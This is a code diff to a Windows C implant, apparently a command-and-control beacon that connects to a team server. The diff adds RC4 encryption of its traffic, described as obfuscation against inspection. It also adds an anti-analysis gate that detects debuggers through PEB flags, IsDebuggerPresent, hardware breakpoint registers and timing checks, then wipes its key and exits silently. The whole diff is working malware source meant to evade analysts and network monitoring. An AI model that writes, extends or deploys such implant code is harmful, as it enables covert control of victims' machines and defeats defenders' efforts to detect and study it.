@@ -74,6 +74,18 @@
 #ifndef AGENT_VERSION
 #define AGENT_VERSION "1.0.0"
 #endif
+/* RC4 transport key, as bare hex digits. Every line of the protocol is
+ * RC4-encrypted with this key before it goes on the wire (inside TLS when TLS
+ * is on). The listener re-keys per message with the same value; the framing is
+ * the JSON's own '\n' inside the ciphertext, plus one framing '\n' outside it.
+ * This is obfuscation against casual inspection, not authenticated encryption. */
+#ifndef AGENT_RC4KEY
+#define AGENT_RC4KEY "{{RC4KEY}}"
+#endif
+/* 1 = compile in the anti-analysis gate, 0 = leave it out entirely. */
+#ifndef AGENT_ANTI_ANALYSIS
+#define AGENT_ANTI_ANALYSIS {{ANTI_ANALYSIS}}
+#endif
 /* Callbacks over TLS, trusted by pinning the SHA-256 of the listener's own
  * certificate. A team server is reached by IP with a self-signed certificate, so
  * the system store can neither verify it nor be the thing we verify against, and
@@ -101,6 +113,11 @@ static char g_beacon[BEACON_SIZE] = {0};
 static char g_hostname[256] = {0};
 static char g_username[256] = {0};
 static const char *g_agent_version = AGENT_VERSION;
+
+/* Runtime-resolved RC4 transport key (decoded from AGENT_RC4KEY hex once). */
+static unsigned char g_rc4key[64];
+static int g_rc4key_len = 0;
+static int g_rc4key_ready = 0;
 
 /* Registration was refused for a reason that a retry cannot fix. Beaming at a
  * server that will never enrol this payload is the loudest footprint an agent
@@ -142,6 +159,148 @@ static void jittered_sleep(int base_seconds, int jitter_pct) {
     Sleep((DWORD)(total * 1000));
 }
 
+/* ── RC4 transport layer ───────────────────────────────────────────────
+ *
+ * Every protocol line is RC4-encrypted with AGENT_RC4KEY before it reaches
+ * the socket. When TLS is on this happens first and TLS then records the
+ * ciphertext, so the two layers compose rather than compete: RC4 obfuscates
+ * the line, TLS protects it on the wire. The framing matches the listener's
+ * _rc4_extract exactly — the JSON's own '\n' sits inside the ciphertext and
+ * one framing '\n' is appended outside it — because RC4 output length equals
+ * plaintext length, so a ciphertext byte can equal '\n' and cannot be used as
+ * a delimiter. */
+
+static void rc4_crypt(const unsigned char *key, int keylen,
+                      const unsigned char *in, unsigned char *out, size_t len) {
+    unsigned char s[256];
+    int i, j;
+    size_t k;
+
+    if (!key || keylen <= 0) {
+        if (out != in && len) memcpy(out, in, len);
+        return;
+    }
+    for (i = 0; i < 256; i++) s[i] = (unsigned char)i;
+    j = 0;
+    for (i = 0; i < 256; i++) {
+        j = (j + s[i] + key[i % keylen]) & 0xFF;
+        { unsigned char t = s[i]; s[i] = s[j]; s[j] = t; }
+    }
+    i = j = 0;
+    for (k = 0; k < len; k++) {
+        unsigned char t;
+        i = (i + 1) & 0xFF;
+        j = (j + s[i]) & 0xFF;
+        t = s[i]; s[i] = s[j]; s[j] = t;
+        out[k] = (unsigned char)(in[k] ^ s[(s[i] + s[j]) & 0xFF]);
+    }
+    /* Do not leave the RC4 state on the stack. */
+    memset(s, 0, sizeof(s));
+}
+
+/* Decode the AGENT_RC4KEY hex string once into g_rc4key. */
+static void init_rc4_key(void) {
+    const char *hex = AGENT_RC4KEY;
+    size_t hlen = strlen(hex);
+    size_t n = hlen / 2;
+    size_t i;
+
+    g_rc4key_ready = 0;
+    g_rc4key_len = 0;
+    if (n == 0) return;
+    if (n > sizeof(g_rc4key)) n = sizeof(g_rc4key);
+    for (i = 0; i < n; i++) {
+        char c;
+        int v = 0;
+        int ok = 0;
+
+        c = hex[i * 2];
+        if (c >= '0' && c <= '9') { v = (c - '0') << 4; ok = 1; }
+        else if (c >= 'a' && c <= 'f') { v = (c - 'a' + 10) << 4; ok = 1; }
+        else if (c >= 'A' && c <= 'F') { v = (c - 'A' + 10) << 4; ok = 1; }
+        if (!ok) return;
+        c = hex[i * 2 + 1];
+        if (c >= '0' && c <= '9') { v |= c - '0'; ok = 1; }
+        else if (c >= 'a' && c <= 'f') { v |= c - 'a' + 10; ok = 1; }
+        else if (c >= 'A' && c <= 'F') { v |= c - 'A' + 10; ok = 1; }
+        if (!ok) return;
+        g_rc4key[i] = (unsigned char)v;
+    }
+    g_rc4key_len = (int)n;
+    g_rc4key_ready = 1;
+}
+
+/* ── anti-analysis gate ─────────────────────────────────────────────── */
+
+/* Minimal PEB definition: winnt.h does not export PPEB on MinGW. Offsets
+ * below are for x64 (0x02 = BeingDebugged, 0x0BC = NtGlobalFlag). */
+typedef struct _PUP_PEB {
+    BYTE Reserved1[2];
+    BYTE BeingDebugged;
+    BYTE Reserved2[1];
+    PVOID Reserved3[4];
+} PUP_PEB;
+
+#define PUP_PEB_ADDRESS ((PUP_PEB *)__readgsqword(0x60))
+#define PUP_NTGLOBALFLAG_OFFSET 0xBC
+#define PUP_NTGLOBALFLAG_DEBUG 0x70
+
+#if AGENT_ANTI_ANALYSIS
+
+/* True when the process looks like it is being analysed. */
+static int detect_analysis(void) {
+    DWORD t0, t1;
+    CONTEXT ctx;
+    PUP_PEB *pPeb;
+
+    /* 1. PEB->BeingDebugged */
+    pPeb = PUP_PEB_ADDRESS;
+    if (pPeb && pPeb->BeingDebugged) return 1;
+
+    /* 2. PEB->NtGlobalFlag: 0x70 set by the loader under a debugger. */
+    if (pPeb && (*(DWORD *)((BYTE *)pPeb + PUP_NTGLOBALFLAG_OFFSET) &
+                 PUP_NTGLOBALFLAG_DEBUG)) return 1;
+
+    /* 3. IsDebuggerPresent */
+    if (IsDebuggerPresent()) return 1;
+
+    /* 4. Hardware breakpoints in DR0-DR3. */
+    memset(&ctx, 0, sizeof(ctx));
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    if (GetThreadContext(GetCurrentThread(), &ctx)) {
+        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return 1;
+    }
+
+    /* 5. Timing: a debugger inflates the wall clock of a short Sleep. */
+    t0 = GetTickCount();
+    Sleep(2000);
+    t1 = GetTickCount();
+    if (t1 < t0) return 0;            /* tick wrap */
+    if ((t1 - t0) > 3000) return 1;   /* slept ~2s but lost >1s */
+
+    return 0;
+}
+
+/* Exit quietly if any anti-analysis check trips. */
+static void anti_analysis_gate(void) {
+    if (detect_analysis()) {
+        memset(g_rc4key, 0, sizeof(g_rc4key));
+        ExitProcess(0);
+    }
+}
+
+#define AA_GATE() anti_analysis_gate()
+
+#else /* !AGENT_ANTI_ANALYSIS */
+
+/* Compiled out, but referenced from AA_GATE() call sites, so mark it unused
+ * to keep -Wall -Wextra clean when the gate is disabled. */
+__attribute__((unused))
+static void anti_analysis_gate(void) { /* compiled out */ }
+#define AA_GATE() ((void)0)
+
+#endif /* AGENT_ANTI_ANALYSIS */
+
 /* ── transport: raw TCP, or the same socket under TLS ──
  *
  * The protocol frames each message with a newline, so the two paths differ
@@ -170,6 +329,10 @@ typedef struct {
 
 static tls_state g_tls;
 static int g_tls_on = 0;
+
+/* Defined with the RC4 read path below, but called from close_conn (which
+ * sits above it), so declare it here. */
+static void rc4_read_reset(void);
 
 static PSecurityFunctionTableA tls_api(void) {
     static PSecurityFunctionTableA table = NULL;
@@ -457,6 +620,59 @@ static int tls_send(SOCKET s, const char *data) {
     return off == len ? 0 : -1;
 }
 
+/* Binary-safe variant of tls_send for a caller that already holds the exact
+ * bytes to put on the wire (RC4 ciphertext, which may contain NUL and its own
+ * framing newline). tls_send takes a C string and appends a newline of its
+ * own; that is wrong for a pre-framed buffer, where strlen would stop at the
+ * first NUL the RC4 stream happened to produce and a second appended newline
+ * would corrupt the frame. This sends exactly `len` bytes, in records. */
+static int tls_send_bytes(SOCKET s, const unsigned char *data, size_t len) {
+    PSecurityFunctionTableA api = tls_api();
+    SecBufferDesc desc;
+    SecBuffer buf[4];
+    SECURITY_STATUS st;
+    unsigned long hdr = (unsigned long)g_tls.sizes.cbHeader;
+    unsigned long trl = (unsigned long)g_tls.sizes.cbTrailer;
+    size_t chunk_max = g_tls.sizes.cbMaximumMessage
+                           ? (size_t)g_tls.sizes.cbMaximumMessage : 16384;
+    size_t cap = chunk_max + hdr + trl + (size_t)g_tls.sizes.cbBlockSize;
+    BYTE *record = (BYTE *)malloc(cap);
+    size_t off = 0;
+
+    if (!record) return -1;
+    while (off < len) {
+        size_t chunk = len - off;
+        size_t total;
+        if (chunk > chunk_max) chunk = chunk_max;
+        memcpy(record + hdr, data + off, chunk);
+        buf[0].BufferType = SECBUFFER_STREAM_HEADER;
+        buf[0].pvBuffer = record;
+        buf[0].cbBuffer = hdr;
+        buf[1].BufferType = SECBUFFER_DATA;
+        buf[1].pvBuffer = record + hdr;
+        buf[1].cbBuffer = (unsigned long)chunk;
+        buf[2].BufferType = SECBUFFER_STREAM_TRAILER;
+        buf[2].pvBuffer = record + hdr + chunk;
+        buf[2].cbBuffer = trl;
+        buf[3].BufferType = SECBUFFER_EMPTY;
+        buf[3].pvBuffer = NULL;
+        buf[3].cbBuffer = 0;
+        desc.ulVersion = SECBUFFER_VERSION;
+        desc.cBuffers = 4;
+        desc.pBuffers = buf;
+        st = api->EncryptMessage(&g_tls.ctx, 0, &desc, 0);
+        if (st != SEC_E_OK) {
+            tls_report("encrypt", st);
+            break;
+        }
+        total = (size_t)buf[0].cbBuffer + buf[1].cbBuffer + buf[2].cbBuffer;
+        if (raw_send_all(s, (char *)record, total) != 0) break;
+        off += chunk;
+    }
+    free(record);
+    return off == len ? 0 : -1;
+}
+
 /* One DecryptMessage pass over whatever is buffered, reading from the socket
  * whenever the buffer does not hold a whole record. Returns 1 when it consumed
  * a record, 0 when nothing came of it, -1 on a failure that ends the socket. */
@@ -567,12 +783,11 @@ static void close_conn(SOCKET s) {
      * credentials handle across a reconnect is how a beacon ends up talking
      * TLS session-record-number state from a connection that no longer exists. */
     tls_reset();
+    rc4_read_reset();
     closesocket(s);
 }
 
-static int agent_send(SOCKET s, const char *data) {
-    if (g_tls_on) return tls_send(s, data);
-
+static int raw_plain_send(SOCKET s, const char *data) {
     size_t len = strlen(data);
     size_t sent = 0;
     while (sent < len) {
@@ -580,26 +795,157 @@ static int agent_send(SOCKET s, const char *data) {
         if (n <= 0) return -1;
         sent += (size_t)n;
     }
-    if (send(s, "\n", 1, 0) != 1) return -1;
     return 0;
 }
 
-static int agent_readline(SOCKET s, char *buf, int len) {
-    if (g_tls_on) return tls_readline(s, buf, len);
+/* RC4-frame one protocol line and hand the ciphertext to the transport below
+ * (plaintext socket, or TLS when it is on). Framing matches the listener's
+ * _rc4_extract: the JSON's own '\n' is inside the RC4 and one framing '\n' is
+ * appended outside it, so the line that goes on the wire is
+ * RC4(json + '\n') + '\n'. */
+static int agent_send(SOCKET s, const char *data) {
+    unsigned char framed[SEND_BUF_SIZE];
+    size_t len = strlen(data);
+    int rc;
 
-    int total = 0;
-    int overflow = 0;
-    char c;
-    for (;;) {
-        int n = recv(s, &c, 1, 0);
-        if (n <= 0) return -1;
-        if (c == '\n') break;
-        if (c == '\r') continue;
-        if (total < len - 1) buf[total++] = c;
-        else overflow = 1;                /* read to the end, then drop it */
+    if (!g_rc4key_ready) init_rc4_key();
+    /* data may already end in '\n' from some callers; the contract is exactly
+     * one JSON + '\n' inside the ciphertext, so normalise to that. */
+    while (len > 0 && data[len - 1] == '\n') len--;
+    /* +2: one for the inner '\n' (which IS part of the ciphertext, so it must
+     * be encrypted as the next byte of the RC4 stream, not appended raw) and
+     * one for the outer framing '\n' (which is NOT encrypted). */
+    if (len + 2 > sizeof(framed)) return -1;
+    /* Encrypt json AND its trailing '\n' as one stream: RC4(json + '\n'). The
+     * inner newline is a plaintext byte like any other, so it takes the next
+     * keystream byte — writing it raw would put an unencrypted 0x0a where the
+     * listener's _rc4_extract expects ciphertext and decrypt a wrong byte. */
+    memcpy(framed, data, len);
+    framed[len] = (unsigned char)'\n';                 /* plaintext inner '\n' */
+    rc4_crypt(g_rc4key, g_rc4key_len, framed, framed, len + 1);
+    framed[len + 1] = (unsigned char)'\n';             /* outer framing, raw */
+    len += 2;
+
+    if (g_tls_on) {
+        rc = tls_send_bytes(s, framed, len);
+    } else {
+        rc = raw_plain_send(s, (const char *)framed);
     }
-    buf[total] = '\0';
-    return overflow ? -1 : total;
+    memset(framed, 0, sizeof(framed));
+    return rc;
+}
+
+/* ── RC4 read path ─────────────────────────────────────────────────────
+ *
+ * The wire carries RC4(json+'\n')+'\n' per message, and RC4 output length
+ * equals plaintext length, so a ciphertext byte can equal '\n'. Newline
+ * framing on the wire is therefore meaningless. Instead this reads raw
+ * transport-decrypted bytes (TLS or plain socket), accumulates them, strips
+ * the outer framing newline(s), RC4-decrypts, and extracts the first balanced
+ * JSON object — the mirror of the listener's _rc4_extract. */
+
+/* Read up to cap raw transport-decrypted bytes into out; returns the count, or
+ * -1 on a socket error / EOF. Under TLS this pulls one decrypted chunk; on a
+ * plain socket it is one recv(). */
+static int transport_read_raw(SOCKET s, unsigned char *out, int cap) {
+    if (g_tls_on) {
+        int progress = tls_decrypt_once(s);
+        if (progress < 0) return -1;
+        size_t avail = g_tls.plain_len - g_tls.plain_off;
+        if (avail == 0) return 0;
+        if (avail > (size_t)cap) avail = (size_t)cap;
+        memcpy(out, g_tls.plain + g_tls.plain_off, avail);
+        g_tls.plain_off += avail;
+        return (int)avail;
+    }
+    int n = recv(s, (char *)out, cap, 0);
+    return n;
+}
+
+/* Find the end of the first balanced top-level JSON object in text (which
+ * respects string literals and escapes), or NULL if none is complete yet.
+ * Returns a pointer just past the closing '}'. */
+static const char *json_object_end_c(const char *start) {
+    int depth = 0, in_string = 0, escaped = 0;
+    const char *p = start;
+    while (*p) {
+        if (in_string) {
+            if (escaped) escaped = 0;
+            else if (*p == '\\') escaped = 1;
+            else if (*p == '"') in_string = 0;
+        } else if (*p == '"') in_string = 1;
+        else if (*p == '{') depth++;
+        else if (*p == '}' && --depth == 0) return p + 1;
+        p++;
+    }
+    return NULL;
+}
+
+/* Persistent ciphertext accumulator across calls for one connection. It has to
+ * persist because a message may span several reads and RC4 is a stream: the
+ * listener holds the same invariant in self._rc4_buf. Reset per connection in
+ * close_conn via rc4_read_reset(). */
+static unsigned char g_rc4_accum[RECV_BUF_SIZE * 4];
+static size_t g_rc4_accum_len = 0;
+
+static void rc4_read_reset(void) {
+    memset(g_rc4_accum, 0, sizeof(g_rc4_accum));
+    g_rc4_accum_len = 0;
+}
+
+static int agent_readline(SOCKET s, char *buf, int len) {
+    if (!g_rc4key_ready) init_rc4_key();
+
+    for (;;) {
+        /* Decrypt what we already hold and look for a complete object. */
+        if (g_rc4_accum_len > 0) {
+            /* Strip outer framing newlines the listener never encrypted. */
+            size_t ct_len = g_rc4_accum_len;
+            while (ct_len > 0 && (g_rc4_accum[ct_len - 1] == '\n' ||
+                                  g_rc4_accum[ct_len - 1] == '\r'))
+                ct_len--;
+            if (ct_len > 0) {
+                static char plain[RECV_BUF_SIZE * 4];
+                if (ct_len < sizeof(plain)) {
+                    rc4_crypt(g_rc4key, g_rc4key_len,
+                              g_rc4_accum, (unsigned char *)plain, ct_len);
+                    plain[ct_len] = '\0';
+                    const char *obj_start = strchr(plain, '{');
+                    if (obj_start) {
+                        const char *obj_end = json_object_end_c(obj_start);
+                        if (obj_end) {
+                            size_t obj_len = (size_t)(obj_end - obj_start);
+                            if ((int)obj_len < len) {
+                                memcpy(buf, obj_start, obj_len);
+                                buf[obj_len] = '\0';
+                                memset(plain, 0, sizeof(plain));
+                                /* One message consumed; drop the accumulator so
+                                 * the next call reads the next frame fresh. */
+                                rc4_read_reset();
+                                return (int)obj_len;
+                            }
+                            memset(plain, 0, sizeof(plain));
+                            return -1;   /* does not fit the caller's buffer */
+                        }
+                    }
+                    memset(plain, 0, sizeof(plain));
+                }
+            }
+        }
+
+        /* Need more ciphertext: read one raw chunk. */
+        if (g_rc4_accum_len >= sizeof(g_rc4_accum)) return -1;
+        int n = transport_read_raw(s, g_rc4_accum + g_rc4_accum_len,
+                                   (int)(sizeof(g_rc4_accum) - g_rc4_accum_len));
+        if (n < 0) return -1;
+        if (n == 0) {
+            /* No more bytes this pass; if nothing has accumulated, the peer
+             * closed. Loop again only if there is buffered data to retry. */
+            if (g_rc4_accum_len == 0) return -1;
+            continue;
+        }
+        g_rc4_accum_len += (size_t)n;
+    }
 }
 
 /* ── JSON helpers ── */
@@ -1597,6 +1943,8 @@ int main(void) {
     WSADATA wsa;
     srand((unsigned int)time(NULL) ^ GetCurrentProcessId());
 
+    init_rc4_key();
+
     get_hostname();
     get_username();
 
@@ -1605,6 +1953,9 @@ int main(void) {
     }
 
     g_tls_on = AGENT_TLS;
+
+    /* Compile-time-gated anti-analysis tripwire, before any network activity. */
+    AA_GATE();
 
     while (1) {
         SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
